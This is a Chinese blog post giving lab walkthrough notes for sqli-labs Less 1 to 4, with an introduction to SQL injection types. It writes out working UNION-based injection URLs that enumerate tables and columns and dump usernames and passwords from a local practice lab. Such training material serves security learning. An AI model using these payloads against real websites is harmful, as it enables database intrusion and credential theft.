<!DOCTYPE HTML>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="keywords" content="Sqli-labs通关笔记, Junk Blog">
    <meta name="description" content="SQL注入简介
什么是SQL注入？SQL 注入英文名叫 SQL Injection，是发生于应用程序与数据库层的安全漏洞。简单来说，就是在输入的字符串中注入 SQL 命令，如果程序忽略了字符检查，那么这些注入进去的恶意软件就会被数据库误认为">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>Sqli-labs通关笔记 | Junk Blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    <style type="text/css">
        
    </style>

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>


<body>

<header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="container">
            <div class="nav-wrapper">
                <div class="brand-logo">
                    <a href="/" class="waves-effect waves-light">
                        
                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
                        
                        <span class="logo-span">Junk Blog</span>
                    </a>
                </div>
                

<a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>首页</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <i class="fa fa-tags"></i>
            
            <span>标签</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <i class="fa fa-bookmark"></i>
            
            <span>分类</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>归档</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>关于</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/friends" class="waves-effect waves-light">
            
            <i class="fa fa-address-book"></i>
            
            <span>友情链接</span>
        </a>
    </li>
    
    <li>
        <a id="toggleSearch" class="waves-effect waves-light">
            <i id="searchIcon" class="mdi-action-search" title="搜索"></i>
        </a>
    </li>

</ul>

<div class="side-nav" id="mobile-nav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Junk Blog</div>
        <div class="logo-desc">
            
            一息尚存，此志不容稍懈。
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                首页
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-tags"></i>
                
                标签
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-bookmark"></i>
                
                分类
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                归档
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                关于
            </a>
        </li>
        
        <li>
            <a href="/friends" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-address-book"></i>
                
                友情链接
            </a>
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fa fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>

    <div class="social-link">
    <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fa fa-github"></i>
    </a>



    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=RHZxdXFydXJ9dHEENTVqJysp" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fa fa-envelope-open"></i>
    </a>



    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2515616905" class="tooltipped" data-tooltip="QQ联系我: 2515616905" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>


</div>
</div>

            </div>
        </div>

        
        <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/hhkk2334/hhkk2334.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>
</header>





<div class="bg-cover post-cover" style="background-image: url('https://i.loli.net/2020/02/08/tAbOqHD9JfP4U87.png')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        Sqli-labs通关笔记
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }
</style>
<div class="row">
    <div class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/sqli-labs/" target="_blank">
                                <span class="chip bg-color">sqli-labs</span>
                            </a>
                        
                            <a href="/tags/SQL-Injection/" target="_blank">
                                <span class="chip bg-color">SQL Injection</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fa fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Web-security/" class="post-category" target="_blank">
                                Web security
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                <div class="post-date info-break-policy">
                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2020-02-08
                </div>

                
                    
                    <div class="info-break-policy">
                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
                        14.6k
                    </div>
                    

                    
                    <div class="info-break-policy">
                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
                        67 分
                    </div>
                    
                
				
				
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h2><hr>
<h3 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h3><p>SQL 注入英文名叫 SQL Injection，是发生于应用程序与数据库层的安全漏洞。简单来说，就是在输入的字符串中注入 SQL 命令，如果程序忽略了字符检查，那么这些注入进去的恶意软件就会被数据库误认为是正常的 SQL 命令来运行。</p>
<p><img src="https://i.loli.net/2019/10/10/jNa3tZQyVJgDIHn.png" alt="less-1-1.png"></p>
<h3 id="SQL-注入的类型"><a href="#SQL-注入的类型" class="headerlink" title="SQL 注入的类型"></a>SQL 注入的类型</h3><h4 id="按照注入点类型来分类"><a href="#按照注入点类型来分类" class="headerlink" title="按照注入点类型来分类"></a>按照注入点类型来分类</h4><ul>
<li><p>数字型注入点<br>许多网页链接有类似的结构 <code>http://xxx.com/users.php?id=1</code> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递 id 等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code></p>
</li>
<li><p>字符型注入点<br>网页链接有类似的结构 <code>http://xxx.com/users.php?name=admin</code> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code></p>
</li>
<li><p>搜索型注入点<br>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>keyword=关键字</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code></p>
</li>
</ul>
<h4 id="按照数据提交的方式来分类"><a href="#按照数据提交的方式来分类" class="headerlink" title="按照数据提交的方式来分类"></a>按照数据提交的方式来分类</h4><ul>
<li><p>GET 注入<br>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code>, id 是注入点。</p>
</li>
<li><p>POST 注入<br>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>
</li>
<li><p>Cookie 注入<br>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>
</li>
<li><p>HTTP 头部注入<br>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
</li>
</ul>
<h4 id="按照执行效果来分类"><a href="#按照执行效果来分类" class="headerlink" title="按照执行效果来分类"></a>按照执行效果来分类</h4><ul>
<li><p>基于布尔的盲注<br>即可以根据返回页面判断条件真假的注入。</p>
</li>
<li><p>基于时间的盲注<br>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
</li>
<li><p>基于报错注入<br>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
</li>
<li><p>联合查询注入<br>可以使用union的情况下的注入。</p>
</li>
<li><p>堆查询注入<br>可以同时执行多条语句的执行时的注入。</p>
</li>
<li><p>宽字节注入<br>宽字节注入源于程序员设置 MySQL 连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从而导致的注入漏洞。</p>
</li>
</ul>
<h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p><img src="https://i.loli.net/2019/09/12/wRNZ32vybPloCUe.png" alt="less-1.png"></p>
<p>当我输入上面的 URL 时，浏览器就会发送 sql 命令</p>
<pre class="line-numbers language-mysql"><code class="language-mysql">select * from TABLE where id='1' limit 0,1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>给服务器，之后服务器会将结果传输给浏览器，最后浏览器将数据展示页到面上给用户看。</p>
<p><img src="https://i.loli.net/2019/09/12/JYhq5CG6jgbOkwV.png" alt="less-2.png"></p>
<p>之后通过修改 URL，达到服务器执行插入的 SQL 命令，并返回到页面上。这里浏览器发送sql命令是：</p>
<pre class="line-numbers language-mysql"><code class="language-mysql">select * from TABLE where id='-1' union select 1,database(),2;--+' limit 0,1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><p>GET 型基于错误的单引号字符型注入</p>
<hr>
<ol>
<li><strong>GET 方式提交 id</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/13/QEuwBkNStycYWp9.png" alt="less-3.png"></p>
<ol start="2">
<li><strong>添加 “单引号” 报错，爆出数据库软件名称和部分 SQL 语句</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/13/qfNOhSmYiIuojr9.png" alt="less-4.png"></p>
<p>从 <font color="red">‘1’’ LIMIT 0,1</font>的报错信息中可以判断出后台执行的 sql 语句：select * from TABLE where id=’1’ limit 0,1;</p>
<ol start="3">
<li><strong>order by 猜测字段数</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=1' order by 1%23
......
http://192.168.150.128/sqli-labs-master/Less-1/?id=1' order by 4%23 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/14/5xpfnLvgQbMo2GY.png" alt="less-5.png"></p>
<p><strong>PS：</strong><br>order by 4  时页面报错，判断 TABLE 字段数为3。<br>这里的 %23 表示的是 “#” 符号，用来注释后面的语句。字符 “#” 浏览器不会编码，需要手动编码 %23</p>
<ol start="4">
<li><strong>查看字段显示位置</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' union select 1,2,3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/14/1uhvRM2CylzDiNE.png" alt="less-6.png"></p>
<p><strong>PS：</strong><br>union 之前的语句必须返回空值，因为 mysql_fetch_array() 函数 只能获取一条信息。也就是说：整个 SQL 语句中，只能返回一个 SQL 执行结果。</p>
<ol start="5">
<li><strong>获取数据库登录用户、数据库名</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' union select 1,user(),database()%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/14/ckphjUCl9RsW3wM.png" alt="less-07.png"></p>
<p><strong>PS：</strong><br>user()：获取当前登录的数据库用户<br>database()：获取数据库名称6</p>
<ol start="6">
<li><strong>爆表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/14/CRAPlKj9MOSth7u.png" alt="less-8.png"></p>
<p><strong>PS：</strong><br>group_concat()  函数可以让查询获得的数据组成一行显示。</p>
<p>在 MySQL 中，把 information_schema 是信息数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。</p>
<ol start="7">
<li><strong>爆表中的字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/14/lqsM6SErwChAzHe.png" alt="less-9.png"></p>
<ol start="8">
<li><strong>爆数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/14/D1i9J2FrnAedRSk.png" alt="less-10.png"></p>
<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>GET 型基于错误的整型注入</p>
<hr>
<ol>
<li><strong>GET 方式提交 id</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/hczVTEGkLxBKqg3.png" alt="less2-1.png"></p>
<ol start="2">
<li><strong>添加 “单引号” 报错，爆出数据库软件名称和部分 SQL 语句</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/OfAUBh3GtZVC1Sa.png" alt="less2-9.png"></p>
<p>从 <font color="red">‘ LIMIT 0,1</font>的报错信息中可以判断出后台执行的 sql 语句：select * from TABLE where id=1 limit 0,1;</p>
<ol start="3">
<li><strong>order by 猜测字段数</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=1 order by 1%23
......
http://192.168.150.128/sqli-labs-master/Less-2/?id=1 order by 4%23 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/t2iVy8IpFEuqC4v.png" alt="less2-3.png"></p>
<ol start="4">
<li><strong>查看字段显示位置</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 union select 1,2,3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/rRZdH8sDgtSEU9z.png" alt="less2-4.png"></p>
<ol start="5">
<li><strong>获取数据库登录用户、数据库名</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 union select 1,user(),database()%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/t49AcbmUJz5oqRe.png" alt="less2-5.png"></p>
<ol start="6">
<li><strong>爆表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/o58QxD4vF27AnON.png" alt="less2-6.png"></p>
<ol start="7">
<li><strong>爆表中的字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/5SQJhzNPgod3REq.png" alt="less2-7.png"></p>
<ol start="8">
<li><strong>爆数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/RdtWMP52Z9SOe8B.png" alt="less2-8.png"></p>
<h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>基于错误的GET单引号变形字符型注入</p>
<hr>
<ol>
<li><strong>GET 方式提交 id</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/bDk6cAvFt1KHLih.png" alt="less-3-1.png"></p>
<ol start="2">
<li><strong>添加 “单引号” 报错，爆出数据库软件名称和部分 SQL 语句</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/lDahJc16OZIt2Mj.png" alt="less-3-2.png"></p>
<p>从 <font color="red">‘1’’) LIMIT 0,1</font>的报错信息中可以判断出后台执行的 sql 语句：select * from TABLE where id=(‘1’) limit 0,1;</p>
<ol start="3">
<li><strong>order by 猜测字段数</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=1') order by 1%23
......
http://192.168.150.128/sqli-labs-master/Less-3/?id=1') order by 4%23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/XAgYZGJdphajutm.png" alt="less-3-3.png"></p>
<ol start="4">
<li><strong>查看字段显示位置</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') union select 1,2,3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/NhwYyp4aUSGdti7.png" alt="less-3-4.png"></p>
<ol start="5">
<li><strong>获取数据库登录用户、数据库名</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') union select 1,user(),database()%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/6QBAjReh4FlnLZT.png" alt="less-3-5.png"></p>
<ol start="6">
<li><strong>爆表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/lpMxdXcFByGUJtH.png" alt="less-3-6.png"></p>
<ol start="7">
<li><strong>爆表中的字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/bxhCuIB4iw6ntK5.png" alt="less-3-8.png"></p>
<ol start="8">
<li><strong>爆数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/15/YyNp6tkK2PMUoLG.png" alt="less-3-7.png"></p>
<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>基于错误的GET双引号字符型注入</p>
<hr>
<ol>
<li><strong>GET 方式提交 id</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/19/he6pGSZLnzi1TDM.png" alt="less4-1.png"></p>
<ol start="2">
<li><strong>添加 “单引号”，无报错</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/19/2EHuTXJgWzqVepR.png" alt="less4-2.png"></p>
<ol start="3">
<li><strong>添加 “双引号”报错，爆出数据库软件名称和部分 SQL 语句</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/19/GuBp4ZdMQLvySKb.png" alt="less4-3.png"></p>
<ol start="4">
<li><strong>order by 猜测字段数</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=1") order by 4%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/19/uh2YiQnCaPcXVDN.png" alt="less4-4.png"></p>
<ol start="5">
<li><strong>查看字段显示位置</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,2,3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/19/UXosdxFR3GbS8AC.png" alt="less4-5.png"></p>
<ol start="6">
<li><strong>获取数据库登录用户、数据库名</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,user(),database()%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/19/BiHf9dv8q7h61Et.png" alt="less4-6.png"></p>
<ol start="7">
<li><strong>爆表</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/19/tTxAJIonLFMdHji.png" alt="less4-7.png"></p>
<ol start="8">
<li><strong>爆表中的字段</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/19/l41pBASQqw9EkjW.png" alt="less4-8.png"></p>
<ol start="9">
<li><strong>爆数据</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(username),group_concat(password) FROM security.users %23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2019/09/19/nBE2Yqu6stT59jy.png" alt="less4-9.png"></p>
